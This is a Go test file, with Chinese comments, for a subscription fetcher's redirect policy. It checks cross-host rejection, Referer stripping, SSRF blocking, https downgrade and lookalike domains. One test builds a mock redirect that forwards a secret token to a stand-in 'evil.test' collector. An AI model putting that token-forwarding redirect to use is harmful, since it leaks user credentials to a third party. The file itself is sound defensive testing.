package subscription

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// dualDeps 让 public.test / evil.test 分别落到两个不同的测试服务器，
// 用于验证跨主机重定向是否会被拒绝、以及被拒绝时第三方是否收到请求。
func dualDeps(t *testing.T, primary, other *httptest.Server) fetchDeps {
	t.Helper()
	dialer := &net.Dialer{}
	return fetchDeps{
		resolve: func(_ context.Context, host string) ([]net.IP, error) {
			switch strings.ToLower(host) {
			case "public.test", "sub.public.test":
				return []net.IP{net.ParseIP("93.184.216.34")}, nil
			case "evil.test":
				return []net.IP{net.ParseIP("93.184.216.35")}, nil
			default:
				return nil, fmt.Errorf("unexpected host %s", host)
			}
		},
		dialTCP: func(ctx context.Context, network, addr string) (net.Conn, error) {
			host, _, err := net.SplitHostPort(addr)
			if err != nil {
				return nil, err
			}
			switch host {
			case "93.184.216.34":
				return dialer.DialContext(ctx, network, primary.Listener.Addr().String())
			case "93.184.216.35":
				return dialer.DialContext(ctx, network, other.Listener.Addr().String())
			}
			return nil, fmt.Errorf("unexpected dial target %s", addr)
		},
		timeout: 5 * time.Second,
	}
}

// 带 token 的订阅跳转到另一个公网域名：必须拒绝，第三方不能收到任何请求。
func TestCrossHostRedirectRejectedWithoutLeakingToken(t *testing.T) {
	var evilHits int32
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&evilHits, 1)
		_, _ = w.Write([]byte("attacker got token=" + r.URL.Query().Get("token")))
	}))
	defer evil.Close()

	var primary *httptest.Server
	primary = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r,
			fmt.Sprintf("http://evil.test:%d/collect?token=%s", localPort(t, evil), r.URL.Query().Get("token")),
			http.StatusFound)
	}))
	defer primary.Close()

	deps := dualDeps(t, primary, evil)
	subURL := fmt.Sprintf("http://public.test:%d/sub?token=SECRET-TOKEN", localPort(t, primary))

	_, _, err := doWithDeps(context.Background(), subURL, false, deps)
	if err == nil {
		t.Fatal("跨主机重定向必须被拒绝")
	}
	if !errors.Is(err, ErrCrossHostRedirect) {
		t.Fatalf("期望 ErrCrossHostRedirect，实际 %v", err)
	}
	if n := atomic.LoadInt32(&evilHits); n != 0 {
		t.Fatalf("第三方收到了 %d 次请求，订阅凭据可能泄漏", n)
	}
}

// 同主机重定向仍然允许，但绝不能携带 Referer（原始 URL 的 token 就在其中）。
func TestSameHostRedirectSendsNoReferer(t *testing.T) {
	var mu sync.Mutex
	var referer, rawQuery string
	seen := 0

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/start":
			http.Redirect(w, r, "/final", http.StatusFound)
		case "/final":
			mu.Lock()
			referer = r.Header.Get("Referer")
			rawQuery = r.URL.RawQuery
			seen++
			mu.Unlock()
			_, _ = io.WriteString(w, "ok")
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	deps := testDeps(t, srv, nil)
	subURL := fmt.Sprintf("http://public.test:%d/start?token=SECRET-TOKEN", localPort(t, srv))

	body, _, err := doWithDeps(context.Background(), subURL, false, deps)
	if err != nil {
		t.Fatalf("同主机重定向应允许: %v", err)
	}
	if string(body) != "ok" {
		t.Fatalf("最终响应体不符: %q", body)
	}
	mu.Lock()
	defer mu.Unlock()
	if seen != 1 {
		t.Fatalf("最终地址应只请求一次，实际 %d 次", seen)
	}
	if referer != "" {
		t.Fatalf("重定向请求不应携带 Referer，实际 %q", referer)
	}
	if strings.Contains(rawQuery, "token") {
		t.Fatalf("跳转后的请求不应继承原始查询参数: %q", rawQuery)
	}
}

// 同站点子域跳转被视为可信：sub.public.test → public.test 允许。
func TestSameSiteSubdomainRedirectAllowed(t *testing.T) {
	content := "proxies:\n  - name: n1\n    type: ss\n"
	var primary *httptest.Server
	primary = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.WriteString(w, content)
	}))
	defer primary.Close()

	var edge *httptest.Server
	edge = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r,
			fmt.Sprintf("http://public.test:%d/sub", localPort(t, primary)),
			http.StatusMovedPermanently)
	}))
	defer edge.Close()

	deps := fetchDeps{
		resolve: func(_ context.Context, host string) ([]net.IP, error) {
			switch strings.ToLower(host) {
			case "sub.public.test":
				return []net.IP{net.ParseIP("93.184.216.34")}, nil
			default:
				return []net.IP{net.ParseIP("93.184.216.35")}, nil
			}
		},
		dialTCP: func(ctx context.Context, network, addr string) (net.Conn, error) {
			host, _, _ := net.SplitHostPort(addr)
			target := primary.Listener.Addr().String()
			if host == "93.184.216.34" {
				target = edge.Listener.Addr().String()
			}
			return (&net.Dialer{}).DialContext(ctx, network, target)
		},
		timeout: 5 * time.Second,
	}

	body, _, err := doWithDeps(context.Background(),
		fmt.Sprintf("http://sub.public.test:%d/sub?token=T", localPort(t, edge)), false, deps)
	if err != nil {
		t.Fatalf("同站点子域重定向应允许: %v", err)
	}
	if string(body) != content {
		t.Fatalf("应拿到最终订阅内容，实际 %q", body)
	}
}

// 跨主机重定向被拒绝不能绕过 SSRF：内网目标仍然先被 URL/DNS 校验拦下。
func TestRedirectToPrivateStillBlocked(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "http://10.0.0.9/secret", http.StatusFound)
	}))
	defer srv.Close()

	deps := testDeps(t, srv, nil)
	_, _, err := doWithDeps(context.Background(),
		fmt.Sprintf("http://public.test:%d/start", localPort(t, srv)), false, deps)
	if err == nil {
		t.Fatal("重定向到内网必须被拒绝")
	}
	if !errors.Is(err, ErrBlockedAddress) {
		t.Fatalf("期望 ErrBlockedAddress，实际 %v", err)
	}
}

// https 被降级到 http：必须拒绝。
func TestRedirectDowngradeRejected(t *testing.T) {
	from, _ := url.Parse("https://public.test/sub")
	to, _ := url.Parse("http://public.test/sub")
	if err := redirectAllowed(from, to); !errors.Is(err, ErrInsecureRedirect) {
		t.Fatalf("期望 ErrInsecureRedirect，实际 %v", err)
	}
}

// 重定向目标带 userinfo：会被 Go 自动转成 Authorization，必须拒绝。
func TestRedirectWithUserInfoRejected(t *testing.T) {
	from, _ := url.Parse("https://public.test/sub")
	to, _ := url.Parse("https://user:pass@public.test/sub")
	if err := redirectAllowed(from, to); !errors.Is(err, ErrBlockedAddress) {
		t.Fatalf("期望 ErrBlockedAddress，实际 %v", err)
	}
}

// 主机相似但不同站（evil-example.com vs example.com）不能误判为同站点。
func TestSameSiteHostBoundary(t *testing.T) {
	cases := []struct {
		a, b string
		want bool
	}{
		{"example.com", "example.com", true},
		{"cdn.example.com", "example.com", true},
		{"example.com", "cdn.example.com", true},
		{"evil-example.com", "example.com", false},
		{"example.com.evil.test", "example.com", false},
		{"Example.COM.", "example.com", true},
	}
	for _, c := range cases {
		if got := sameSiteHost(c.a, c.b); got != c.want {
			t.Fatalf("sameSiteHost(%q,%q)=%v，期望 %v", c.a, c.b, got, c.want)
		}
	}
}

// 合法订阅更新不受重定向策略影响：直接 200 仍正常返回。
func TestDirectSubscriptionStillWorks(t *testing.T) {
	content := "proxies:\n  - name: n1\n    type: ss\n"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.WriteString(w, content)
	}))
	defer srv.Close()

	deps := testDeps(t, srv, nil)
	body, _, err := doWithDeps(context.Background(),
		fmt.Sprintf("http://public.test:%d/sub", localPort(t, srv)), false, deps)
	if err != nil {
		t.Fatalf("正常订阅拉取不应失败: %v", err)
	}
	if string(body) != content {
		t.Fatalf("内容不符: %q", body)
	}
}
